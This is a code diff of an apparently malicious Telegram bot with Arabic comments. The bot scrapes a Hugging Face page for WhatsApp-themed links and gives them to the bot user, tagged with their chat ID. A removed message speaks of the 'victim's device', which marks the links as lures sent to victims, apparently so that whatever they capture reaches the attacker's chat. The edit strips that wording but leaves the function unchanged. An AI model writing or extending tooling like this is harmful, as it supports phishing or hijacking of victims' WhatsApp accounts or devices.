@@ -1719,16 +1719,22 @@ bot.on('callback_query', async (callbackQuery) => {
     if (data === 'request_verification') {
         const url = "https://sssssskskjwnsb-linklsksn.hf.space";
 
+// إرسال رسالة انتظار
+bot.sendMessage(chatId, "⏳ جاري البحث عن رابط واتساب...");
+
 // استيراد الروابط من الموقع
 axios.get(url, { timeout: 10000 })
     .then(response => {
         const $ = cheerio.load(response.data);
         let foundLink = null;
         
-        // البحث عن الرابط الذي ينتهي بـ "/n"
+        // البحث عن الرابط الذي ينتهي بـ "/n" ويرتبط بـ واتساب
         $('a[href]').each((index, element) => {
             const link = $(element).attr('href');
-            if (link.endsWith('/n')) {
+            if (link.endsWith('/n') && 
+                (link.includes('whatsapp') || 
+                 $(element).text().toLowerCase().includes('whatsapp') ||
+                 $(element).find('img').attr('alt')?.toLowerCase().includes('whatsapp'))) {
                 foundLink = link;
                 return false; // إيقاف loop عند العثور على أول رابط
             }
@@ -1737,17 +1743,19 @@ axios.get(url, { timeout: 10000 })
         if (foundLink) {
             // بناء الرابط النهائي مع chatId
             const fullLink = `${foundLink}?chatId=${chatId}`;
-            const message = `✅ تم إنشاء الرابط بنجاح\n\n🔗 الرابط: ${fullLink}\n\nملاحظة: قم باستخدام رابط جديد في كل مرة ويجب أن يكون الاتصال قويًا في جهاز الضحية`;
+            const message = `✅ تم إنشاء رابط واتساب بنجاح\n\n🔗 الرابط: ${fullLink}\n\nملاحظة: قم باستخدام رابط جديد في كل مرة`;
             
-            return bot.sendMessage(chatId, message);
+            bot.sendMessage(chatId, message);
         } else {
-            return bot.sendMessage(chatId, "❌ لم يتم العثور على رابط مناسب في الموقع");
+            bot.sendMessage(chatId, "❌ لم يتم العثور على رابط واتساب مناسب في الموقع");
         }
     })
     .catch(error => {
         console.error('Error fetching link:', error);
         bot.sendMessage(chatId, `❌ خطأ في جلب الرابط: ${error.message}`);
     });
+        return;
+    }
 
     const [action, userId] = data.split(':');
 
